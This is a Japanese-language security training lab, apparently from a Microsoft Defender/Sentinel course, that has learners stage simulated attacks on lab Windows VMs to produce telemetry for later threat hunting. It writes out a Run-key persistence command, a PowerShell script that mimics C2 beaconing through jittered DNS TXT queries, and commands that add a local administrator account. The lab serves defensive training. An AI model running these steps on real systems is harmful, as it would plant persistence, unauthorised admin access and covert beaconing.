# モジュール 7 - ラボ 1 - エクササイズ 5 - 攻撃の実施

### タスク 1: Defender for Endpoint によって構成したWindowsを攻撃します。

このタスクでは、Microsoft Defender for Endpoint が構成されているホストに対して攻撃を実行します。

1. 管理者として WIN1 仮想マシンにログインします。パスワードは **Pa55w.rd** です。  

2. タスクバーの検索で、*Command* と入力します。  検索結果にコマンドプロンプトが表示されます。  コマンドプロンプトを右クリックして、**管理者として実行**を選択します。表示されるユーザーアカウント制御のプロンプトを確認します。

3. コマンドプロンプトで、各行の後に Enter キーを押して、各行にコマンドを入力します。
```
cd \
mkdir temp
cd temp
```
4. 攻撃 1 -このコマンドをコピーしてコマンド プロンプト アプリに実行します。

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

5. 攻撃 3 - 次のコマンドをコピーして実行します。

```
notepad c2.ps1
```
**はい** を選択して新しいファイルを作成し、以下の PowerShell スクリプトを c2.ps1 にコピーして**保存**を選択します。

**注** 仮想マシンへの貼り付けには長さの制限がある場合があります。  これを 3 つのセクションに貼り付けて、すべてのスクリプトが仮想マシンに貼り付けられるようにします。  スクリプトがメモ帳 c2.ps1 ファイル内のこれらの手順のように見えることを確認してから、メモ帳ファイルを保存します。

```


param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)


$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)

$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout

    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        
        $x2 = 1

    }
    else
    {
        $x2 = $x2 + 1
    }
    
    if ($x3 -eq 7 )
    {

        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout

        $x3 = 1
        
    }
    else
    {
        $x3 = $x3 + 1
    }


    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)

```

コマンドプロンプトで、次のように入力し、各行の後に Enterキーを押して各行にコマンドを入力します。
```
powershell
.\c2.ps1
```
**注:** 解決エラーが表示されます。これは予想されることです。
このコマンド/パワーシェルスクリプトをバックグラウンドで実行します。ウィンドウを閉じないでください。  コマンドは、数時間ログエントリを生成する必要があります。  このスクリプトの実行中に次のタスクや次の演習に進むことができます。  このタスクで作成したデータは、後で脅威の捜索ラボで使用します。  このプロセスでは、大量のデータや処理を作成することはありません。

### タスク 2: Sysmon で構成された攻撃ウィンドウ

このタスクでは、セキュリティイベントコネクタが構成され、Sysmon が構成されているホストに対して攻撃を実行します。

1. 管理者として WIN2 仮想マシンにログインします。パスワードは **Pa55w.rd** です。  

2. タスクバーの検索で、*CMD* と入力します。  検索結果にコマンド プロンプトが表示されます。  コマンド プロンプトを右クリックして、**「管理者として実行」** を選択します。  表示される 「承認」 および 「ユーザー アカウント制御」 プロンプト。

3. コマンドプロンプトで、各行の後に Enter キーを押して、各行にコマンドを入力します。
```
cd \
mkdir temp
cd \temp
```

4. 攻撃 1 - このコマンドをコピーしてコマンド プロンプト アプリに実行します。

```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

5. 攻撃 2 - このコマンドをコピーして実行し、各行の後に Enter キーを押して各行にコマンドを入力します。

```
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

## 演習 6 に進みます。
